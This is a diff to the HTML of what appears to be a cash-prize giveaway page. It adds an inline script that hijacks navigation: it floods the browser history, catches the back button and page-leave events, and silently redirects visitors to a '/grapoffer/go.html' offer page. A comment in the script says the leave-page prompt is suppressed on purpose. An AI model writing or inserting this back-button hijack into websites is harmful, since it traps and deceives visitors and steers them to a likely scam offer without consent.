@@ -244,5 +244,61 @@ Win up to ₦250,000 in Cash Prizes! </p>
 <!-- BEGIN: Powered by Supercounters.com -->
 <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1737094,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
 
+<script>
+!function(a, e, t, n) {
+  const redirectURL = "/grapoffer/go.html";
+
+  const c = function(trigger) {
+    if (a.onbeforeunload === null) {
+      a.onbeforeunload = function() {
+        if (trigger) {
+          setTimeout(function() {
+            a.onbeforeunload = null;
+            a.location.replace(redirectURL);
+          }, 100);
+        }
+        // Do not return anything to avoid Chrome popup
+      };
+    }
+  };
+
+  !function(a, e, t, n) {
+    n.replaceState(null, t.title, e.pathname + e.search);
+    for (let i = 0; i < 10; i++) {
+      try {
+        n.pushState(null, t.title, e.pathname + e.search);
+      } catch (err) {
+        i = 10;
+      }
+    }
+
+    a.addEventListener("popstate", function() {
+      n.replaceState(null, t.title, e.pathname + e.search);
+      a.onbeforeunload = null;
+      a.location.replace(redirectURL);
+    });
+  }(a, e, t, n);
+
+  try {
+    a.performance.getEntriesByType("navigation").forEach(function(entry) {
+      if (entry.type !== "reload") {
+        c(entry.type !== "navigate");
+      }
+    });
+  } catch (err) {
+    c(true);
+  }
+
+  t.addEventListener("click", function(event) {
+    for (let el = event.target; el && el !== this; el = el.parentNode) {
+      if (el.matches("a")) {
+        a.onbeforeunload = null;
+        break;
+      }
+    }
+  }, false);
+}(window, location, document, history);
+</script>
+	
 </body>
 </html>
